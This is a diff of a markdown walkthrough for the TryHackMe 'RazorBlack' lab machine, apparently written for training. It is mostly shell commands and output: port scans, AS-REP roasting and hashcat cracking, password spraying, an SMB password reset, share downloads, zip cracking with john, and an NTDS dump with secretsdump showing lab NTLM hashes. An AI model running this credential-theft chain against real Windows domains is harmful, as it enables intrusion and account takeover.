@@ -40,7 +40,7 @@ The given box ```RazorBlack``` is a Linux machine with an IP address of ```10.10
 
 On performing a nmap scan on the target, we can see there are 32 standard ports open
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# masscan -p1-65535,U:1-65535 --rate=1000 10.10.135.22 -e tun0
 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-11 15:34:16 GMT
 Initiating SYN Stealth Scan
@@ -83,7 +83,7 @@ Discovered open port 49694/tcp on 10.10.135.22
 
 And also it discovered that the machine is running ```Windows``` OS
 
-```c
+```shell
 # Nmap 7.92 scan initiated Sat Jul  9 19:57:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/_full_tcp_nmap.txt -oX /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/xml/_full_tcp_nmap.xml 10.10.247.120
 Increasing send delay for 10.10.247.120 from 0 to 5 due to 611 out of 1527 dropped probes since last increase.
 Increasing send delay for 10.10.247.120 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
@@ -235,7 +235,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 While enumerating port 111 a nfs is been opened, And found a flag ```THM{ab53e05c9a98def00314a14ccbfa8104}```  from sbradley user and one more file is there where all usernames was mentioned.
 
-```c
+```shell
 Export list for 10.10.247.120:
 /users (everyone)
 
@@ -287,7 +287,7 @@ clin
 
 Trying TGT with help of converted usernames..
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile usernames_mod.txt -format hashcat -outputfile asreproast_hash.txt -dc-ip 10.10.135.22
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -306,7 +306,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Got the hash of ```twilliams``` 
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# cat asreproast_hash.txt
 $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd
 ```
@@ -314,7 +314,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b
 #### Cracking the hash
 
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 18200 asreproast_hash.txt /usr/share/wordlists/rockyou.txt | tee kerberoast-password.txt
 hashcat (v6.2.5) starting
 
@@ -377,7 +377,7 @@ Stopped: Mon Jul 11 21:59:34 2022
 ```
 
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -H 10.10.40.138 -u twilliams -p roastpotatoes
 [+] IP: 10.10.40.138:445        Name: 10.10.40.138
         Disk                                                    Permissions     Comment
@@ -391,7 +391,7 @@ root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -H 10.10.40.138 -u twilliams
 
 ```
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.40.138 -u usernames_mod.txt -p roastpotatoes  --continue-on-success
 SMB         10.10.40.138    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
 SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE
@@ -410,7 +410,7 @@ SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\clin:roas
 ```
 
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# smbpasswd -r 10.10.40.138 -U sbradley
 Old SMB password:
 New SMB password:
@@ -418,7 +418,7 @@ Retype new SMB password:
 Password changed for user sbradley on 10.10.40.138.
 ```
 
-```c
+```shell
 root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123
 [+] IP: 10.10.40.138:445        Name: 10.10.40.138
         Disk                                                    Permissions     Comment
@@ -523,15 +523,38 @@ root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u
         fr--r--r--         18927164 Tue Mar 16 11:32:20 2021    experiment_gone_wrong.zip
         fr--r--r--               37 Sun Feb 28 00:54:21 2021    sbradley.txt
 
-root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123 --download '.\trash\chat_log_20210222143423.txt'
-[+] Starting download: trash\chat_log_20210222143423.txt (1340 bytes)
-[+] File output to: /root/thm/machines/medium/raz0rblack/10.10.40.138-trash_chat_log_20210222143423.txt
+```
 
-root@rE3oN:~/thm/machines/medium/raz0rblack# ls
-10.10.40.138-trash_chat_log_20210222143423.txt  ferox-http_10_10_247_120:47001_-1657378037.state  kerberoast-password.txt  usernames_mod.txt
-asreproast_hash.txt                             ferox-http_10_10_247_120:5985_-1657378037.state   results                  usernames.txt
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# smbclient -U 'sbradley' \\\\10.10.45.238\\trash
+Password for [WORKGROUP\sbradley]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Mar 16 11:31:28 2021
+  ..                                  D        0  Tue Mar 16 11:31:28 2021
+  chat_log_20210222143423.txt         A     1340  Fri Feb 26 00:59:05 2021
+  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 11:32:20 2021
+  sbradley.txt                        A       37  Sun Feb 28 00:54:21 2021
 
-root@rE3oN:~/thm/machines/medium/raz0rblack# cat 10.10.40.138-trash_chat_log_20210222143423.txt
+                5101823 blocks of size 4096. 1003171 blocks available
+smb: \> mget *
+Get file chat_log_20210222143423.txt? y
+getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+Get file experiment_gone_wrong.zip? y
+parallel_read returned NT_STATUS_IO_TIMEOUT
+Get file sbradley.txt? y
+getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip getting file \sbradley.txt of size 37 as sbradley.txt (0.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+smb: \> recurse on
+smb: \> prompt on
+smb: \> mget *
+getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.9 KiloBytes/sec) (average 1.3 KiloBytes/sec)
+getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (1423.3 KiloBytes/sec) (average 1223.6 KiloBytes/sec)
+getting file \sbradley.txt of size 37 as sbradley.txt (0.0 KiloBytes/sec) (average 1161.6 KiloBytes/sec)
+smb: \> exit
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# cat chat_log_20210222143423.txt
 sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
 Administrator> What vulnerability??
 sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
@@ -550,4 +573,47 @@ The administrator died after this incident.
 
 Press F to pay respects
 
+root@rE3oN:~/thm/machines/medium/raz0rblack# cat sbradley.txt
+THM{ab53e05c9a98def00314a14ccbfa8104}                                                                 
+root@rE3oN:~/thm/machines/medium/raz0rblack# zip2john experiment_gone_wrong.zip > john_hash.txt
+ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
+ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+electromagnetismo (experiment_gone_wrong.zip)
+1g 0:00:00:00 DONE (2022-07-12 20:28) 1.428g/s 11983Kp/s 11983Kc/s 11983KC/s elliotfrost..ejsa457
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# unzip experiment_gone_wrong.zip
+Archive:  experiment_gone_wrong.zip
+[experiment_gone_wrong.zip] system.hive password:
+  inflating: system.hive
+  inflating: ntds.dit
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee secretsdump.txt
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::
 ```
